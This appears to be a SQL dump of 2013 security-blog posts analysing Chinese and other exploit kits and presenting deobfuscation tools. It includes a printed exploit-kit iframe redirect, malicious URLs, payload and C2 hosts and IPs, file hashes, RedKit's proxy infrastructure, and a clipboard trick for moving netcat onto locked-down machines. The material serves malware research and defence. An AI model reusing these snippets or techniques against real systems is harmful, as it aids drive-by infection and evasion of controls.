INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (63, 'Deobfuscating the CK Exploit Kit', 'darryl', 'September 2, 2013', 'The CK Exploit Kit has been around since 2012 and has its roots in the NetBoom Exploiter kit according to security blog site CySecTa. You can read about its history and other information here.\nOutput from the NB Exploiter doesn’t resemble the scripts found in today’s CK Exploit Kit so we’re probably talking about a completely new tool. However, when you take a closer look, you will find variable names like “nbcode”, “nbChar”, and “nbencode” so there may be some code reuse after all.\n\nFinding a live instance of the CK Exploit Kit these days is a somewhat of a challenge. The drive-by download appears for less than a day then the files are removed from the server. This exploit kit tends to show up on Chinese and Korean sites. \nThe CK Exploit Kit is definitely out of date but since it’s still being used today, I thought I would document it here for my reference. I won’t spend too much time digging into the kit since there’s already several good write-ups including this one from KISA – Korean Internet & Security Agency.\nThe landing page looks like this (you will notice the text “ck” referenced in variable names in several places). The “top.js” file is a plug-in detector and mainly checks for IE and Java versions. \n\nThe Javascript is compressed using a variant of Dean Edwards’ packer. You can barely make out the variables p, a, c, k, e, d in between the comment tags:\n\nThe variable “p” holds the deobfuscated value so you just need to replace “return p” with “document.write(‘<textarea>’+p)”:\n\nSince this script checks your cookie to make sure you only run it once, you can remove that part or just clear your browser cookies if you need to visit the page a second time. You should see a textbox containing the uncompressed script.\n\nAll I did here was add the “script” tags, copy the function “ckl” from the landing page back to this page, and then separated the blocks of script so I can make better sense of it. If you go through the script, you’ll find that you can deobfuscate the script by modifying the function in the red block which is basically “window[document][write](t)”.\n\nChange the red block text to this: “window[X3cQCMIIF][ErTiUlaxlkP](‘<textarea>’+t)” and execute the script. You will again see a small textbox with your deobfuscated script in it. Here’s the final script with an interesting class name. Apparently someone didn’t have a good day.\n\nInside one of those applets, the hilarity continues with another funny string:\n\nNear the bottom of the landing page, the script will open one of two HTML files depending on the version of IE used to visit the page.\nif(ck_wm.indexOf(“msie 6”)>-1){document.write(“< iframe src=zip.html width=60 height=1>< /iframe>”);}else if(ck_wm.indexOf(“msie 7”)>-1||ck_wm.indexOf(“msie 8”)>-1){document.write(“< iframe src=win.html width=60 height=1>< /iframe>”);}\nThis zip.html page uses the same obfuscation method as the landing page:\n\nWhen you deobfuscate the script, it should look something like this. This hosts the CVE-2012-1889 exploit.\n\nThe second page, win.html, calls up a Flash file which is protected with DoSWF.\n\nBy the way, it contains an interesting string “King Lich V” which may be related to PlugX based on this write-up from Jaime Blasco.\n\nThe script references an file “Moview1.html” which I wasn’t able to pull down in time. Presumably this is exploiting CVE-2013-0634. The shellcode is XOR’d using the value 0xE2 which is the same as Jaime’s sample from 2012.\n\nThe payload file was downloaded from p.wangwangwangwangwang.com (174.139.88.102):\n\nThe payload was a Trojan that checked in at qwe.xzczxcasrafdsfzxcvzv.com:3306 (98.126.71.38).\nFile: logo.swf (dropper)\nMD5: ad760c37c4198449b81b4992a3f2d561\nVT: 6 / 45\nFile: ckwm.jar (CVE-2011-3544)\nMD5: 4a562094a9d2771507e50faf08a6ca79\nVT: 8 / 46\nFile: wmck.jar (CVE-2012-4681)\nMD5: 5b47778d02048bb081b122cb11367217\nVT: 22 / 45\nFile: p.exe\nMD5: b8c0bec6b361c971a09d2b6a93692291\nVT: 25 / 46', 'chinese exploit pack, ck vip exploit, netboom', 'http://www.kahusecurity.com/?p=12868\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (64, 'Chinese Exploit Pack Updated', 'darryl', 'August 29, 2013', 'If you been keeping up with Java exploits recently, you’ll know that there’s been several exploit packs being updated with them. Check out Kafeine’s blog for the latest!\nIt seems that at least one Chinese exploit pack was updated recently as well. The “Gong Da Pack” is now using CVE-2013-2465. At the time of this writing, the pack is being hosted on a Korean website.\nGong Da is still using “Dadong’s JSXX 0.44 VIP” Javascript obfuscator athough the identifying comment string no longer appears (and hasn’t been used for awhile):\n\nAfter deobfuscating the script, there’s a new entry for Java 6 Update 0 through 45. Interestingly, the exploit for Java 7 Update 0 through 10 has not been replaced or updated.\n\nWhat makes this notable is that the Java applet is obfuscated which is atypical for Gong Da (bottom). At the top is the original POC (Packet Storm Advisory 2013-0811-1) that was made available on 8/12/2013. You can see similarities throughout the code.\n\nSome of the strings within the applet were obfuscated using a five-byte XOR key. Here’s an obfuscated string from the applet:\n\\013I\\bmg\\033Y\\016Wv\\001a\\035Pc\\037I\\016\nAfter applying the XOR key (120, 44, 124, 62, 2), the decoded string appears:\nsetSecurityManager\nWhile not unexpected, the use of Java obfuscation by Chinese packs is new. We’ll have to see if this is a new procedure or a one-off.\nBy the way, the payload was a Trojan that checked into a website at ftukl.com:6677.\nFile: gehYl3.jar\nSize: 8K\nMD5: 349423e93f5bc75d40f11ed23e7fa1e2\nVT: 3 / 46\nFile: js.exe\nSize: 99.2K\nMD5: fbc68bc19fda902ccb51231278af4add\nVT: 27 / 45', 'dadong, gong da, java exploit', 'http://www.kahusecurity.com/?p=12853\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (65, 'Wild Wild West – 08/2013', 'sectek', 'August 4, 2013', 'Added the following packs:\n“FlashPack”\n“Topic Exploit Kit”\nSilence Exploit\n“Rawin Exploit Pack”\nPrivate Exploit Pack\n“DotCacheF”\nKore Exploit Kit', '', 'http://www.kahusecurity.com/?p=12847\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (66, 'Tools Update', 'darryl', 'July 27, 2013', 'I’ve updated several of the tools which you can download from here. I hope you find the updates useful. Thank you for your continued support!\nConverter v0.9\nIn this release, I’ve added several new functions.\n\nYou can now convert a base64-encoded text file into a binary file (and vice versa). Just choose File > Convert Base64/Binary.\n\nUnder the Stats menu, you will find Character Frequency and Hex Frequency options. Paste in some text or hex in the input field and Converter will count the number of times the character or hex appears. Might be helpful for statistical analysis.\n\nThis routine that XORs three different values was found in a malicious Java applet.\n\nWhile you can perform the XOR calculation twice as I’ve explained here, I thought I would make things easier. Just put the XOR values in an array marked off by curly braces and separate them by commas. Make sure you choose the appropriate key format and action (consecutive).\n\nWhat Converter will do is xor the input by extracting the values from the array like this. And repeat the values in each array until the entire input gets converted.\n\nHere’s code from another Java applet. This routine remembers the value of “m” and uses it for the next calculation.\n\nBasically, it’s doing this. The result of the “m” (in the first case, the value of 196) is carried over to subsequent calculation.\n\nThere are now two variables you can use called “acc1” and “acc2”. They are accumulators. The first textbox holds the starting value and the larger textbox holds the calculation you wish to perform. You need to include the text “acc1” as a placeholder for the future result. As Converter loops to process the input field, the result of the previous calculation is carried over to the next calculation where the text, “acc1” resides. I did remove the “usr” value but you can use the “acc1” and “acc2” fields for this purpose as well.\n\nI’ve added this capability to Converter’s Convert Binary File function as well.\nData Converter v0.8\nData Converter has been updated with the XOR array and accumulator expressions features.\n\nFile Converter v0.6\nFile Converter has also been updated with the same features.\n\nRevelo v0.5.2\nI’ve made a minor change to Revelo by removing unused code.\n\nPHP Converter v0.2\nIn the first version, you had to remove everything except for the value you wished to convert. In this version, you can paste in everything starting with “eval”. It’s looking for quotes now so make sure you have them in your input. Hope this works better for you all (but just use PHP instead \n\nBinary File Converter v0.1\nI wrote this program over a year ago and used it to copy over tools I needed over to another computer via VPN which was locked down except for the clipboard.\n\nHere’s a recap on how to use it. Run the program on your PC and click on the “Create VBS File” button and copy the text. Go to the remote PC via VPN, RDC, Secure Desktop, or whatever and paste it into Notepad, save it as a .vbs file and run it. You’ll end up with a a lite version of this program.\nTo copy a tool over to the remote PC like netcat, run the regular version of this program on your PC and read in a binary file, netcat. Copy the text, go to the remote PC, and paste it into the lite version of the program. Now click on the “Write Binary File” button and save it. You will now have netcat on your remote PC. To move files from the remote PC back to your host, just do the same thing in reverse.\nThis is very inefficient but gets the job done in a pinch. Just remember to transfer only small files.', 'converter, revelo', 'http://www.kahusecurity.com/?p=12842\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (67, 'Kore Exploit Kit', 'darryl', 'July 18, 2013', 'Recently, a reader passed on to me a very active TDS link that redirected users to one of four exploit packs. These packs led to some form of ransomware being installed on the victim’s machine. Analysis of these packs have been covered elsewhere but I wanted to document the analysis here in case there are changes. Since there’s a lot to go through, I’ll only cover the important bits.\nExploit Pack #1\nhxxp://cats.dogamusement. com/wp-admin/board.php?connect=17\nhxxp://cats.dogamusement. com/wp-admin/5BB9I\nhxxp://cats.dogamusement. com/wp-admin/cCLP4ceJ\nhxxp://cooks.lustrength. com/backend.php?cars=697&macos=66&main=4&deals=45&energy=171&crime=272&site=479&left=555&click=645&outdoors=571\nHere’s the landing page which shows calls to two applets:\n\nIf you de-base64 the value of the first applet’s parameter, you’ll end up with this which is the same as the second applet. The values are encoded which we’ll come back to in a bit.\n\nBoth applets are similar so we’ll just look at one of them. Here’s the routine to convert those above encoded values.\n\nSo the long parameter value above:\n505c5c58601b596260615f525b5461551b505c5a1c4f4e5058525b511b5d555d2c504e5f602a2\n32624135a4e505c602a2323135a4e565b2a211351524e59602a212213525b525f54662a1e241e\n13505f565a522a1f241f13605661522a21242613595253612a2222221350595650582a232122\nBecomes:\ncooks.lustrength. com/backend.php?cars=697&macos=66&main=4&deals=45&energy=171&crime=272&site=479&left=555&click=645\nAnd the value for the “BzIkzF” parameter:\n5c6261515c5c5f60\nBecomes:\noutdoors\nThis value then becomes the XOR key to decrypt the payload file. This is not a straightforward XOR decryption, however. It uses some math to determine whether to skip the decryption step for a particular byte which you can see below. To decode the payload, you would need to replicate the routine using Python, Perl, Javascript, etc.\n\nThis exploit pack is “Sweet Orange”.\nExploit Pack #2\nhxxp://blog.jiwok. com/blog/?p=5579\nhxxp://blog.jiwok. com/blog/9xa.nfs\nhxxp://blog.jiwok. com/blog/qte.nfs\nhxxp://blog.jiwok. com/blog/contacts.asp\nhxxp://blog.jiwok. com/download.asp?p=1\nThe call to the Java exploit is broken into a couple of webpages. The top file calls the second and so on until the Java applet on the contacts.asp page loads. The landing page contains the string “LOLOLO”.\n\nThe applet contains this routine which decodes the value from the landing page:\n\nIf you enter those into Converter’s Secret Decoder Ring, you can see that this is the URL to the payload:\n\nThe payload is obfuscated and here’s the decryption routine which uses the key found in the applet, “binkey”, to decrypt it.\n\nI believe some are calling this an updated version of RedKit and it very well may be but it seems like it took a step backwards. This is too simple and amateurish. Maybe we should call this the “LOL Exploit Pack” since it refers to the text on the landing page and makes me laugh when I think it’s RedKit v2.\nExploit Pack #3\nhxxp://21sdtrnbrdbre8.flnet. org/j6SM5F9fIkJKjySnhXID19a\nhxxp://21sdtrnbrdbre8.flnet. org/jquery.js\nhxxp://21sdtrnbrdbre8.flnet. org/j6SM5F9fIkJKjySnhXID19a2.zip\nhxxp://21sdtrnbrdbre8.flnet. org/j6SM5F9fIkJKjySnhXID19a?id=2&text=958\nHere’s the landing page:\n\nHere’s what the base64-encoded string looks like after being decoded. Note the parameter value is a string of encoded hex characters.\n\nFirst thing I noticed when the applet was opened was an embedded object. Also, its degree of obfuscation is higher than most. You can see two arguments are being passed to a decryption routine.\n\nThis function here pulls in the string of encoded hex characters from the landing page which I mention above.\n\nThis is its internal decryption routine. First it takes the first argument passed to it and XORs it with the array of decimal values from the top and then XORs it again with the second argument.\n\nWe can replicate that in Converter by making two passes. And here’s the result which is semicolon-delimited (note the second value).\n\nAnd finally this routine takes the embedded object and deXORs it using the key, sSvWQqw63DtE, that we got from the prior step. The payload then gets written to disk and executed.\n\nThis exploit pack is being referred to as “Sibhost” but thanks to an excellent researcher (you know who you are), a more fitting and accurate name is “Kore Exploit Kit”.\nExploit Pack #4\nThe fourth exploit pack the TDS redirected users to looks like this:\nhxxp://evoquninu. pl/gnjamrr1xab0zq9jvyu\nhxxp://evoquninu. pl/c1fb4f5b7.jar\nhxxp://evoquninu. pl/40de2a7ced9.jar\nhxxp://evoquninu. pl/b9b47e2ea8c9\nhxxp://ihifumiku. pl/FlP-QnhpaGt1LHFsaWhpZnVAaWt1LnBsaWg=\nThe landing page is simply a mess:\n\nAfter deobfuscating the script, it looks more readable. Here, we can make out calls to two applets:\n\nThe Java applets are nearly the same as Kore EK but contain a little more obfuscation. The routine you see here is the internal decoder which is identical to Kore. If you look at the class files on the left, you’ll see an embedded object at the bottom. This object gets deobfuscated and executed as an .exe file in the same way as the above kit.\n\nThe good folks over at EmergingThreats have been calling this “FlimKit”. The striking similarities between Kore EK and Flimkit makes me think there’s a strong connection.', 'exploit kit, flimkit, java exploit, kore, lololo, sibhost, sweet orange', 'http://www.kahusecurity.com/?p=12825\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (68, 'JJEncode Script Leads to Drive-By', 'darryl', 'July 4, 2013', 'The use of JJEncode in a drive-by download has been around for a couple of years but has been popping up a lot recently. A couple of readers have asked how to deobfuscate this so here’s a walkthrough with a live script.\nHere’s an automobile forum that’s been compromised:\n\nViewing the source code, this link kicks off the infection:\n\nThen from alnera.eu, you end up getting this strange looking Javascript:\n\nWhat is this? It’s output from JJEncode, a cool script made by Yosuke Hasegawa. It uses only symbols to generate valid Javascript code which, in this case, leads to the compromise of your PC.\n\nThere’s a few ways to deobfuscate this script. I’ll show you two ways. Here’s the slow way but this is how you can understand a little of what’s happening.\nFirst make sure you have “<!DOCTYPE>” at the beginning since this only works with HTML 4.0 and above (with IE anyway). If you’re going to use Firefox or other browser then you don’t have to do this. Now search for semi-colons and add a new line in between. Look carefully for the semi-colons in between quotes as you need to leave those alone. What you will likely end up with will look something like this (the bottom portion won’t have any semi-colons to separate on).\n\nSince I’m working on a malicious script, I want to do this carefully so I’m commenting out everything below what I’m working on. There’s an equal sign near the beginning of each line. This indicates that the characters before it is a variable and the characters after is the value. So all I’m doing is “alerting” on the variable so I can see what each line does. Here’s the first one:\n\nHere is the result:\n\nAnd the second. Notice that I left the first line uncommented. The reason is that it defines the variable “_” so if I comment the first line, nothing will happen on subsequent lines.\n\nKeep going until you reach the line just before the large block of symbols:\n\nThe result tells us that this is a function call and if you look closely you at the end of the script, you’ll realize that the major portion of the script is a self-executing function.\n\nSo we can just replace “_.$(” with “alert(“:\n\nAnd we can see the result:\n\nIf you want to see how the original code looks like, we can make a change to the very end of the line. From this:\n\nTo this:\n\nAnd then we get this result:\n\nHere’s the second way you can deobfuscate this script. It’s fast and easy but may not work 100% of the time. Just add this to the top like so:\n\nAnd the final result appears:\n\nLet’s take a look now at the malicious script and applet. The values of the parameters are base64-encoded. The top URL refers to the payload file. The bottom part loads a single Java applet from another URL and a parameter contains a link to the same payload but with a slightly different URL.\n\nThis is a new exploit pack that the industry named “DotCacheF” but it looks like they changed the URL format.\nThe Java applet is not heavily obfuscated but has a low detection rate. Here’s an excerpt of the code that exploiting CVE-2013-2423.\n\nThe payload appears to be ZeroAccess.\nFile: atom.jar\nMD5: 912a89f21b7f27404c01c95d18e95d1a\nVT: 3 / 46\nFile: sm_main.mp3\nMD5: 8f72a0cb62a01f4fc7ef7064c4b66a8f\nVT: 3 / 47\nUpdate (3/13/17): Russian translation provided by Rauan Akhmetov\nUpdate (5/21/16): Greek translation provided by Nikolaos Zinas\nUpdate (7/25/13): Here’s a Spanish translation of this article here!', 'dotcachef, javascript obfuscation, jjencode', 'http://www.kahusecurity.com/?p=12780\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (69, 'If Computers Were Cars…', 'darryl', 'June 22, 2013', 'Found this on an image site and didn’t see this elsewhere. This is both educational and funny!\n\nCredit to illustrator, imgur.', 'humor, satire', 'http://www.kahusecurity.com/?p=12759\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (70, 'Deobfuscating Javascript with Revelo', 'darryl', 'June 22, 2013', 'I’ve been getting questions about how to use Revelo so this article will be a refresher on how to use it. You can find the tool here and play along if you like. We’ll be using Revelo to deobfuscate a simple script using free online Javascript obfuscators as practice. (I’m not hating on these tools, they are made by smart developers. All we are trying to do is practice our deobfuscation skills.)\nBefore we begin, here’s a couple words of caution! Always run Revelo in a virtual machine and disconnect the Internet just in case. Also, when doing a live analysis, remove object tags if you see them. While Revelo will block access to the Internet, external programs like Flash, Acrobat, Java, etc that are called upon by object tags won’t block access and your machine could get infected.\nHere’s our very basic script. It takes a string of hex, converts it to text, then redirects you to Google:\n\nTo see what this is doing, paste the script into Revelo, making sure it’s surrounded with < script></script> tags. Click on the “Execute” button. Revelo will execute the code, show you what the script result is, then block its attempt to reach the Internet. \n\nIn order to see the final result without having it execute, we need to modify the request (options on the left). The last line of the script gives us a hint, “window.location.assign” followed by “url”. We can intercept that function so copy and paste it into the “Intercept Function with Name” textbox:\n\nClick on the “Results” tab then click on “Execute” and you can see what the URL is:\n\nNow let’s obfuscate the script further using some online tools…\nJavascriptObfuscator.com\nHere’s the output:\n\nWe can see there are a bunch of hex code separated by commas. You can de-hex each array value to figure out what this does, however, just looking at the last line which starts with “window” should be suspicious to you. Since it looks like a function, we can intercept it and send it to a textbox. Copy the highlighted string over to the “Intercept Function with Name” option. What this does is catch the function and display the result without executing it.\n\nClick on “Results” tab then click on “Execute”:\n\nBy the way, you don’t have to use Revelo for any of this. You can simply use Notepad.\n\nwww.daftlogic.com/projects-online-javascript-obfuscator.htm\nHere’s the output which I pasted in Revelo. Since it starts with “eval”, we can use the “Redirect Eval to Action”. What this will do is change “eval” to “document.write” so it doesn’t execute the result.\n\nAnd the result which is our original script:\n\nObfuscatorJavascript.com\nAt first glance, this one is a doozy! It seems to have converted the original script as Base64 then reversed it. At the very end, we see “eval” followed by some variables. Let’s try “Redirect Eval to Action”.\n\nThe result doesn’t look complete. \n\nCopy that script and paste it into the “Javascript” tab and let’s do another round. Don’t forget to add the “script” tags. So it looks like the original script is there but it has been escaped. Also, there’s some call to an API on their website. Since it’s using a document.write to render the script, we can try to enclose everything in a textarea so let’s try that.\n\nCool, it works!\n\nhivelogic.com/enkoder/\nThe creator of this script is brilliant! Not only is the obfuscation tricky, it looks cool. It’s logical + artistic. We’re gonna have to put our thinking caps on for this one!\nAt the end of the script, you see an “eval(x)” call. Let’s redirect the variable so enter “(x)” (including the parenthesis) to “Redirect Variable”. Revelo will display the value of the variable and not execute it.\n\nOn the “results” tab, we get the result, now copy that to the main tab. (I just pasted it in between the existing script tags.) We can see that it’s a function and does some funky math. We need some help here. If you go to the “Tools” tab, there’s a “Highlight Decryption Clues” button. Click on it. This highlights certain keywords that may be helpful to us.\n\nThe “y” variable is storing “i” which is a counter for the loop so that’s not important to us. The “fromCharCode” and “charCodeAt” tells us there is a conversion from decimal to text and that “o” is an accumulator of the result. Aha! If we look a little further, we can see that the result of “o” is returned to the caller of the function. Let’s peek into “o” so we need to intercept that. Type in “return” in the “Intercept Function with Name” field.\n\nWe get the result and paste that to the main tab. Looking at the code, it’s doing the same thing but this time it’s returning a substr of the result. Let’s use “return” one more time.\n\nWow, another layer of obfuscation! Again, we get the result and paste it to the main tab. Looks to be doing it again.\n\nFinally, we get the deobfuscated result! It’s our script wrapped with document.writeln.\n\nHey, since it’s using document.writeln, we can do this:\n\nAnd get the final result in one try:\n\nBlackhole Exploit Kit\nNow let’s try analyzing a real life obfuscated script. This one is from Blackhole’s landing page. You will notice that there are several sets of “script” tags.\n\nIf you paste the entire script in Revelo and execute it, you will have a problem! There’s an object tag hidden somewhere in the script that’s calling Java and it could result in your PC getting infected so remember to run everything in a VM. You can also disconnect from the Internet too if you wish to be even more safe.\n\nThe best way to analyze this is to do each script separately. Realize that some scripts will call other scripts or use variables from another script so we need to have some understanding of the code but this is the best way I know to handle this safely.\nThe Javascript code can be separated in two parts. The script near the top is referencing the content between the “<b>” tags. The scripts below reference the content between “<span>” tags.\n\nLet’s do the top portion first. (Note: I added “</body>” to close the open body tag which is up at the top.) We can see that the variable “a” holds the hex values at the top then it gets converted to HTML (e.g. “d.InnerHTML”) and finally appends itself to the body tag (e.g. “appendChild”). Let’s try the option “Replace InnerHTML with InnerText”. By converting this to text, we can see the HTML code but not have it rendered.\n\nAnd the results show the call to a Java applet.\n\nNow for the second part. The script at the top reads in the content of variable “dd”.\n\nThe bottom part shows the value of “dd” is “q” which is the ID of the span container. It also assigns “eval” to variable “zz”. If you follow the last script section, you’ll see that the variable “zz” gets assigned to “a” then the very last statement, “a(bq)”, is actually “eval(bq)”.\n\nSo we can either intercept function “a” or redirect variable “(bq)”. Either one works and the result will be the same. Note: The string “z0177, 0152…” is part of the span container and is not the result.\n\nHere’s the deobfuscated script of Blackhole’s landing page.\n\nYou’ll find that many malicious scripts will be somewhat easy to deobfuscate. It’s really not worth it for exploit pack authors to spend a lot of time and energy making hard-to-decode scripts. All they need to do is change a simple script often. Look at Blackhole. One of the main reasons for its success is that the landing page script is constantly changing so by the time anti-virus and filtering products detect the script, it’s already updated to something else. And it’s not major changes, just small changes here and there. But that’s enough to get past security defenses.\nI hope you better understand Revelo. It does take knowledge of Javascript to utilize the tool well and of course, practice. Have fun and be safe!', 'blackhole, javascript deobfuscation, revelo', 'http://www.kahusecurity.com/?p=12758\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (71, 'Converter v0.8 Released', 'darryl', 'June 2, 2013', 'I added several new features in this release to help you with reverse engineering malicious content. I hope you will find these changes helpful and easy to use! Converter, File Converter, and Data Converter can be downloaded from the Tools page.\nHere’s a look at the significant additions made to Converter using live examples…\nMixed Text to Hex\nHere’s Neutrino Exploit Kit’s latest obfuscated file:\n\nTo deobfuscate this, we need to first normalize the input into hex. Just paste the data into Converter then click on Format > Mixed Text to Hex and it’s converted to hex code.\n\nNow we can de-xor the hex code into text:\n\nPattern Finder\nBlackhole’s obfuscation method is pretty challenging since it uses a very long XOR key, 128-bytes to be exact. We can try to brute force this key by finding patterns in the obfuscated payload but that can take awhile. What I’ve done is automated this to some degree. It’s not perfect so you will have to put on your thinking caps and analyze the result. At times you will get a repeating pattern within the result so you will have to remove those bytes to get to the real XOR key.\nHere’s an example where it does work.  We use Converter’s Key Search/Convert feature to import the payload file. We really only need the first KB of data so leave the box checked.\n\nNow copy the hex code and go back to the main screen and paste it in the top box. Now choose Tools > Pattern Finder. It will take awhile but when it’s done, your key will be found. The Stats > Count of Characters says there’s 256 characters (which is 128-bytes).\n\nNext we can comma-separate the values by choosing Format > Hex Format – CSV.\n\nCopy the comma-separated key and go back to Tools > Key Search/Convert. Reload the file (just 1KB to test your assumption), select the appropriate options and click on Convert. If all goes well, you’ll get your expected results.\n\nIf not, then it might be that the starting byte is wrong. If that’s the case then you need to manually figure out the starting byte by XORing the first value of the input data string (in this case it’s “B7”) with “M” (0x4D) to get the first value. Look for it in your key then make that byte first.\nWhen you figured out the key and the file is small then reload it without the 1KB limitation and convert it. If it’s too big then use File > Convert Binary File and do it from there.\nSingle Rolling XOR Key\nThere are some exploit packs that use rolling XOR keys. They use the previous input byte or previous result as the key for the next byte. In this release, I’ve added those capabilities as well as the ability to use them in expressions.\n\nThe options for the Single Rolling XOR Key are pretty straight forward, just choose the appropriate option and enter a starting key value. Here’s an example:\nInput in Hex: 1122334455\nHex Key: 70\nResults of Single Rolling XOR Key:\nNone (uses same key for input): 6152433425\n-> 11 xor 70, 22 xor 70, 33 xor 70, etc.\nUse Previous Input Value: 6133117711\n-> 11 xor 70, 11 xor 22, 22 xor 33, etc.\nUse Previous Result: 6143703461\n-> 11 xor 70, 61 xor 22, 43 xor 33, etc.\nFor handling complicated tasks, we can tap into additional capabilities using expressions. I’ve added a Expression Static Decimal Value section so you can add three starting values:\nPre – previous input value (same as “use previous input value”)\nRes – previous result (same as “use previous result”)\nUsr – user-defined value\nLet me show you an example. This is Blackhole’s routine for deobfuscating the payload:\n\nWe can replicate this function in Converter using the following expression. You have to manually figure out the first value to get the result of “M” (0x4D) and then enter that into the starting value for “Pre” (or “Res”, in this case).\nval xor ((((pre xor res) + 170) mod 256) xor 72)\nHere’s the result:\n\nThis capability has been added to both the Key Search/Convert and Convert Binary File functions. The standalone File Converter and Data Converter programs have been updated with this capability as well.\nEnjoy and thank you for your support!', 'converter', 'http://www.kahusecurity.com/?p=12724\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (72, 'Digging Deeper into RedKit', 'darryl', 'May 11, 2013', 'I’ve been studying RedKit for a long time and trying to understand its components, methods, and infrastructure. It turns out this exploit pack is unlike anything I’ve seen before. Just recently, Fraser Howard over at Sophos wrote two great articles on RedKit here and here. I’ll try to write about things I learned that’s not covered there.\nQuick Overview\nIn a typical drive-by download scenario, users visit a compromised website and are redirected to a web server hosting an exploit pack. The exploit pack server delivers the appropriate exploit to compromise the visiting user’s PC then uploads the malicious payload to finish the job.\n\nIn order to infect as many users as possible, the exploit pack server needs to stay up for as long as possible. In the typical setup, the exploit pack server is exposed to every user who lands on its malicious pages.\n \nTo improve its resiliency, exploit pack authors had to find ways to keep the exposure to a minimum. Over time, they deployed several tricks such as redirection rules, traffic distribution systems, dynamic DNS, using dedicated servers for exploits and another for payloads, and so on.\n\nBut in the end, the exploit pack servers are still vulnerable to takedowns because they make their presence known even if they’re hiding behind a dynamic DNS.\n \nEnter RedKit\nRedKit was discovered around this time last year by the excellent researchers over at Trustwave and initially setup like a typical exploit pack. Several months ago, the author(s) of RedKit moved to a new kind of infrastructure, one that was designed to protect its main exploit pack server. It does this by leveraging compromised websites to act as proxies. The real exploit pack server would send files to these compromised websites and give them assigned roles: redirector, exploiter, and dropper.\n\nHere’s a typical RedKit infection chain:\n\n \nIt starts off with a compromised website hosting a malicious iframe tag that leads the unsuspecting visitor to the first link in the chain:\n\nEach compromised website thereafter appears to have an .htaccess file which looks like the following. This redirects any request that comes to the website with a non-existing filename containing 1-4 alphanumeric characters ending in HTM, PDF, or JAR to the default.php page. This rewrite rule gives the authors the flexibility to change the filenames and URL format quite easily.\n\nThe default.php file is different depending on the website’s role. It appears the role can be changed by the RedKit authors though it is not known how they determine the role a website plays and how the file gets updated.\nRedirector Role – Compromised websites tagged with this role have a script that redirects the user to another compromised website via a 301 redirect. This leads to the second link in the chain.\n\nExploiter Role – The script used by compromised websites playing this role deploys the standard rules you see with other exploit packs to prevent multiple infections and to make sure the “undesirable” visitors are kept away. Otherwise it determines the user’s Java version and sends one of three malicious applets (CVE-2012-0422, CVE-2013-0422, CVE-2013-1493). The applets stored in this file are encoded as base64 (note: it has been removed for brevity’s sake).\nHere’s one of the checks it makes:\n\nThis is the excerpt that primes the malicious Java applets:\n\nThe script above creates an HTML page with the appropriate applet that will infect the visitor’s PC:\n\nA few months ago, the exploiter script did a curl to the RedKit backend server (the real exploit pack server) then downloaded and stored the Java applet on the compromised website in a special folder. If another visitor with the same Java version came along, the script would check if the applet was already in the folder and used that applet instead of pulling it down from the backend server again.\nDropper Role – Compromised websites with this role send the payload to the visitor’s PC. The script does a curl to the RedKit backend server and obtains the malicious executable to deliver to the PC.\n\nHere’s what the packet capture shows when the “setup.exe” file is downloaded (which matches the above script):\n\nAlthough this has not been observed, since PHP scripts are used, it’s quite possible to update and/or combine roles quickly and easily.\nNot much is known about the backend, exploit pack server. Because of their infrastructure, the RedKit authors could easily monitor incoming connections and deploy an IP-whitelist to only allow connections from a list of websites they’ve compromised.\nConclusion\nThe RedKit authors have come up with a new strategy to sustain themselves by implementing a unique, resilient infrastructure. This strategy appears to serve several purposes:\n\n Takedowns become confusing and complicated since it appears that compromised (legitimate) websites are hosting the exploit pack.\n The setup gives RedKit authors the flexibility to change the URL formats quickly and easily making detection more difficult.\n Using compromised websites and updating/combining their roles make the entire infrastructure dynamic and resilient.\n The main exploit pack server is not part of the infection process so it’s never exposed.\n Managing one or two exploit pack servers and monitoring the chokepoints for suspicious activity is far easier to do, and do well.\n\nAlthough their strategy appears sound, it’s not without some disadvantages:\n\n Much more compromised websites are needed to build and maintain their infrastructure.\n Owners of compromised websites who detect and remove their scripts can disrupt or even break the infection chain.\n\nRelying on compromised websites makes their infrastructure somewhat fragile and unreliable. However, it appears the RedKit authors have consciously made stealthiness and resiliency of their own server a higher priority over the effectiveness and efficiency of drive-by infections. I suppose they prescribe to the school of thought that having poor loads/stats is better than not having any at all.', 'exploit kit, exploit pack, red kit', 'http://www.kahusecurity.com/?p=12706\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (73, 'Wild Wild West – 04/2013', 'sectek', 'April 25, 2013', 'Mila over at Contagio just released another fantastic update of her exploit pack overview so I thought I’d update the poster.\nAdded the following packs:\nWhitehole\nNeutrino\nFiesta\ng01Pack\n“Zuponic”\n“NoMatch”\nAnonymous Exploit Kit\n“Glazunov”\n“PopAds”\nWhitestorm\nSafePack\n“SPL Pack”\nIf you can share any of the above (source code or panel shots), please do!', 'exploit kit, poster', 'http://www.kahusecurity.com/?p=12688\n');
